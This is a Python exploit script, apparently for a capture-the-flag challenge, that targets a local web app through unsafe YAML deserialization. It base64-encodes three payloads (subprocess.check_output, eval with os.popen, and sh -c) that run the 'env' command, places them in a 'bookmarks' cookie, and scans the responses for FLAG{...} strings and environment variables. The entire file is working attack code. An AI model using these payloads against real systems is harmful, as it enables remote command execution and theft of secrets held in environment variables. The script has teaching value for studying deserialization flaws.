import base64
import requests
import re

# Target URL (assuming standard port)
target_url = "http://127.0.0.1:5000"

# Craft YAML deserialization payload
# Using subprocess.check_output to capture env command output
yaml_payload = """!!python/object/apply:subprocess.check_output
args: [['env']]
"""

# Alternative payload using os.popen for better compatibility
yaml_payload_alt = """!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').popen('env').read()"]
"""

# More sophisticated payload that ensures output is captured
yaml_payload_advanced = """!!python/object/apply:subprocess.check_output
args:
  - ['sh', '-c', 'env']
"""

# Encode payloads
payloads = {
    "subprocess_check_output": yaml_payload,
    "eval_popen": yaml_payload_alt,
    "subprocess_advanced": yaml_payload_advanced
}

print("[*] Testing YAML deserialization payloads for env command execution\n")

for payload_name, payload in payloads.items():
    print(f"[*] Testing payload: {payload_name}")
    print(f"[*] YAML payload:\n{payload}")
    
    # Encode to base64
    encoded_payload = base64.b64encode(payload.encode()).decode()
    print(f"[*] Base64 encoded: {encoded_payload[:50]}...\n")
    
    # Set malicious cookie
    cookies = {
        'user': 'aea729d9fd8b4083b533db2c69e8e238',
        'bookmarks': encoded_payload
    }
    
    try:
        # Send request to trigger deserialization
        response = requests.get(target_url, cookies=cookies, timeout=10)
        
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response length: {len(response.text)} bytes")
        print(f"[+] Response headers: {dict(response.headers)}")
        
        # Search for FLAG pattern
        flags = re.findall(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        if flags:
            print(f"\n[!] FLAG FOUND: {flags[0]}")
            print(f"[!] All flags: {flags}")
        
        # Search for environment variables indicating successful execution
        env_indicators = ['PATH=', 'HOME=', 'USER=', 'FLAG']
        found_indicators = [ind for ind in env_indicators if ind in response.text]
        
        if found_indicators:
            print(f"[+] Environment variable indicators found: {found_indicators}")
            print(f"[+] Command execution successful!\n")
            
        # Print full response to capture all output
        print(f"[+] Full response body:\n{response.text}\n")
        print("="*80 + "\n")
        
    except Exception as e:
        print(f"[-] Error with {payload_name}: {str(e)}\n")
        print("="*80 + "\n")

print("[*] Testing complete")

